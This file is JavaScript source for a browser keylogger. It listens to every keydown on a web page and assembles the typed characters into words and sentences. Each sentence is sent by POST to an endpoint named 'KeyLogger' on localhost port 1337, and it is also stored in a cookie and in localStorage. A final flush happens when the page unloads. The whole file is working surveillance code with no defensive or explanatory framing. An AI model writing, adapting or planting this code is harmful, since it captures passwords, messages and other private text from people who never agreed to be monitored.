const endOfSentence = ['.', '!', '?'];
var chars = [];
var words = [];
document.addEventListener('keydown', e => {
    if (!isKeyImportant(e.keyCode))
        return;
    let char = e.key;
    chars.push(char);
    if (char === ' ') {
        finishedWord();
    }
    if (endOfSentence.indexOf(char) != -1) {
        finishedSentence();
    }
});
//submit before unload
window.onbeforeunload = finishedSentence;
function finishedWord() {
    let word = chars.join('');
    console.log("FINISHED WORD!", word);
    words.push(word);
    chars.length = 0;
}
function finishedSentence() {
    finishedWord();
    var sentence = words.join('');
    words.length = 0;
    console.log("FINISHED SENTENCE!", sentence);
    sendData(sentence);
    addSentenceToCookie(sentence);
    addSentenceToLocalStorage(sentence);
}
function sendData(sentence) {
    fetch('http://localhost:1337/KeyLogger', {
        method: 'POST',
        headers: {
            'Accept': 'application/json',
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            sentence
        })
    });
}
function isKeyImportant(keyCode) {
    return (keyCode > 47 && keyCode < 58) || // number keys
        keyCode == 32 || // spacebar
        (keyCode > 64 && keyCode < 91) || // letter keys
        (keyCode > 95 && keyCode < 112) || // numpad keys
        (keyCode > 185 && keyCode < 193) || // ;=,-./` (in order)
        (keyCode > 218 && keyCode < 223);   // [\]' (in order)
}

const cookieName = 'keyLogger';
function addSentenceToCookie(sentence) {
    var cookie = getCookie(cookieName);
    var data = []
    if (cookie) {
        data = JSON.parse(cookie);
    }
    data.push(sentence);
    document.cookie = cookieName + '=' + JSON.stringify(data);
}

const localStorageName = cookieName;
function addSentenceToLocalStorage(sentence) {
    var stored = localStorage.getItem(localStorageName);
    var data = []
    if (stored) {
        data = JSON.parse(stored);
    }
    data.push(sentence);
    localStorage.setItem(localStorageName, JSON.stringify(data));
}

function getCookie(name) {
    var value = "; " + document.cookie;
    var parts = value.split("; " + name + "=");
    if (parts.length == 2) return parts.pop().split(";").shift();
}
